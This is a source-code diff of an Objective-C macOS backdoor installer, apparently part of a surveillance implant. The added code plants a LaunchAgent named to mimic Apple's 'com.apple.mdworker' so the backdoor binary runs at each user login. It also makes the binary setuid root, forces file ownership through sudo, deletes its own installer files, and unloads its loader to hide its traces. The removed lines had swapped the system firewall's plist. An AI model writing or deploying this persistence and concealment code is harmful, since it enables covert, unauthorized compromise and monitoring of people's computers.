@@ -12,7 +12,9 @@
 #import <sys/types.h>
 #import <pwd.h>
 
-#define INSTALLER_PLIST @"com.apple.mdworkers.plist"
+//#define DEBUG
+#define INSTALLER_PLIST @"com.apple.mdworkers"
+#define BACKDOOR_DAEMON_PLIST @"Library/LaunchAgents/com.apple.mdworker.plist"
 
 
 void changeAttributesForBinaryAtPath(NSString *aPath, int uid, int gid, u_long permissions)
@@ -63,39 +65,97 @@ void executeTask(NSString *anAppPath,
   [task release];
 }
 
-void restoreAlfPlist()
+BOOL savePlist(NSString *username, id anObject, NSString *aPath)
 {
-  NSString *alfPlistPath = [[NSString alloc] initWithFormat: @"/Library/Preferences/com.apple.alf.agent.plist",
-            [[NSBundle mainBundle] bundlePath]];
-
-  NSString *destAlfPlistPath = [[NSString alloc] initWithString:
-    @"/System/Library/LaunchDaemons/com.apple.alf.agent.plist"];
-
-  NSFileManager *_fileManager = [NSFileManager defaultManager];
-
-  if ([_fileManager fileExistsAtPath: alfPlistPath] == NO)
+  BOOL success = [anObject writeToFile: aPath
+                            atomically: YES];
+  
+  if (success == NO)
     {
-      return;
+#ifdef DEBUG
+      NSLog(@"Error while writing plist at %@", aPath);
+#endif
+      return NO;
     }
-
+  
   //
-  // Remove the current alf agent plist
+  // Force owner since we can't remove that file if not owned by us
+  // with removeItemAtPath:error (e.g. backdoor upgrade)
   //
-  [_fileManager removeItemAtPath: destAlfPlistPath
-                           error: nil];
+  NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", username];
+  NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
+    @"/usr/bin/chown",
+    userAndGroup,
+    aPath,
+    nil];
+  
+#ifdef DEBUG
+  NSLog(@"forcing owner: %@", userAndGroup);
+#endif
 
-  //
-  // Copy it to destination
-  //
-  [_fileManager moveItemAtPath: alfPlistPath
-                        toPath: destAlfPlistPath
-                         error: nil];
+  executeTask(@"/usr/bin/sudo", _tempArguments, YES);
+  
+  [_tempArguments release];
+  return YES;
+}
 
-  u_long permissions  = (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
-  changeAttributesForBinaryAtPath(destAlfPlistPath, 0, 0, permissions);
+BOOL createLaunchAgent(NSString *username, NSString *dirName, NSString *aBinary)
+{
+  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
+  NSDictionary *innerDict;
+  NSString *userHome = [[NSString alloc] initWithFormat: @"/Users/%@", username];
+  
+  NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
+           userHome,
+           BACKDOOR_DAEMON_PLIST];
 
-  [alfPlistPath release];
-  [destAlfPlistPath release];
+#ifdef DEBUG
+  NSLog(@"userHome: %@", userHome);
+#endif
+
+  NSString *launchAgentsPath = [NSString stringWithFormat: @"%@/Library/LaunchAgents",
+           userHome];
+
+  if ([[NSFileManager defaultManager] fileExistsAtPath: launchAgentsPath] == NO)
+    {
+
+#ifdef DEBUG
+      NSLog(@"LaunchAgents folder does not exist");
+#endif
+      if (mkdir([launchAgentsPath UTF8String], 0755) == -1)
+        {
+#ifdef DEBUG
+          NSLog(@"Error on LaunchAgents mkdir");
+#endif
+          return NO;
+        }
+    }
+  
+  NSString *backdoorPath = [NSString stringWithFormat: @"%@/Library/Preferences/%@",
+           userHome,
+           dirName];
+  NSString *backdoorBinaryPath = [NSString stringWithFormat: @"%@/%@",
+           backdoorPath,
+           aBinary];
+
+  NSString *errorLog = [NSString stringWithFormat: @"%@/ji33", backdoorPath];
+  NSString *outLog   = [NSString stringWithFormat: @"%@/ji34", backdoorPath];
+
+  innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
+               @"com.apple.mdworker", @"Label",
+               @"Aqua", @"LimitLoadToSessionType",
+               [NSNumber numberWithBool: FALSE], @"OnDemand",
+               [NSArray arrayWithObjects: backdoorBinaryPath, nil], @"ProgramArguments",
+               errorLog, @"StandardErrorPath",
+               outLog, @"StandardOutPath",
+               nil];
+               //[NSNumber numberWithBool: TRUE], @"RunAtLoad", nil];
+  
+  [rootObj addEntriesFromDictionary: innerDict];
+  [innerDict release];
+  [userHome release];
+  
+  return savePlist(username, rootObj, ourPlist);
 }
 
 void deleteCurrentDir()
@@ -131,17 +191,19 @@ int main(int ac, char *av[])
                               username,
                               backdoorDir];
 
-  [_backdoorDir release];
-  [backdoorDir release];
-
   NSString *binaryPath = [[NSString alloc] initWithFormat: @"%@/%@",
            destinationDir,
            binary];
 
   //
-  // Restore com.apple.alf.agent.plist
+  // Create mdworker.flg so that once loaded the backdoor won't relaunch itself
+  // through launchd (will be already loaded by launchd)
   //
-  restoreAlfPlist();
+  NSString *mdworker = [[NSString alloc] initWithFormat: @"%@/mdworker.flg",
+           destinationDir];
+  [@"" writeToFile: mdworker
+        atomically: YES];
+  [mdworker release];
 
   if ([_fileManager fileExistsAtPath: binaryPath])
     {
@@ -164,19 +226,8 @@ int main(int ac, char *av[])
     destinationDir,
     nil];
 
-  executeTask(@"/usr/bin/sudo", arguments, NO);
+  executeTask(@"/usr/bin/sudo", arguments, YES);
   //mkdir([destinationDir UTF8String], 0755);
-
-  //
-  // Delete installer plist path
-  //
-  NSString *installerPlistPath = [[NSString alloc] initWithFormat: @"%@/%@",
-           [[NSBundle mainBundle] bundlePath],
-           INSTALLER_PLIST];
-
-  [_fileManager removeItemAtPath: installerPlistPath
-                           error: nil];
-  [installerPlistPath release];
 
   //
   // Delete ourself in order to avoid to be copied in the next for cycle
@@ -210,51 +261,69 @@ int main(int ac, char *av[])
     }
 
   [currentDir release];
-  [binary release];
   [destinationDir release];
 
   u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
   changeAttributesForBinaryAtPath(binaryPath, 0, 0, permissions);
 
-  arguments = [NSArray arrayWithObjects:
-    @"-u",
-    username,
-    binaryPath,
-    nil];
+  //
+  // Now drop launchAgent file inside user home in order to let the backdoor load
+  // on user login
+  //
+  if (createLaunchAgent(username, backdoorDir, binary) == NO)
+    {
+#ifdef DEBUG
+      NSLog(@"Error on createLaunchAgent");
+#endif
+    }
 
-  //
-  // Execute it as the user
-  //
-  executeTask(@"/usr/bin/sudo", arguments, NO);
+  [backdoorDir release];
+  [_backdoorDir release];
+  [binary release];
 
   //
   // Delete current dir
   //
-  [_fileManager removeItemAtPath: [[NSBundle mainBundle] bundlePath]
-                           error: nil];
+  NSError *err;
 
-  //
-  // Wait for backdoor installation
-  //
-  NSString *workerFlagPath = [[NSString alloc] initWithFormat:
-    @"%@/mdworker.flg",
-    destinationDir];
-
-  while ([_fileManager fileExistsAtPath: workerFlagPath] == NO)
+  if ([_fileManager removeItemAtPath: [[NSBundle mainBundle] bundlePath]
+                               error: &err] == NO)
     {
-      sleep(1);
+#ifdef DEBUG
+      NSLog(@"Error on remove current dir: %@", [err description]);
+#endif
     }
 
   //
-  // Wait just to be sure (if we exit before the child process
-  // has finished we might force-kill it)
+  // Delete installer plist path
   //
-  sleep(5);
+  NSString *installerPlistPath = [[NSString alloc] initWithFormat: @"/System/Library/LaunchDaemons/%@.%@.plist",
+           INSTALLER_PLIST,
+           username];
 
-  [workerFlagPath release];
-  [username release];
+  [_fileManager removeItemAtPath: installerPlistPath
+                           error: nil];
+  [installerPlistPath release];
+
+  //
+  // Safe to unload ourself
+  //
+  NSString *rootLoaderLabel = [NSString stringWithFormat: @"com.apple.mdworkers.%@",
+           username];
+
+#ifdef DEBUG
+  NSLog(@"Removing %@", rootLoaderLabel);
+#endif
+
+  NSArray *args = [NSArray arrayWithObjects:
+    @"remove",
+    rootLoaderLabel,
+    nil];
+
+  executeTask(@"/bin/launchctl", args, YES);
+
   [binaryPath release];
+  [username release];
   [outerPool release];
-
   return 0;
 }
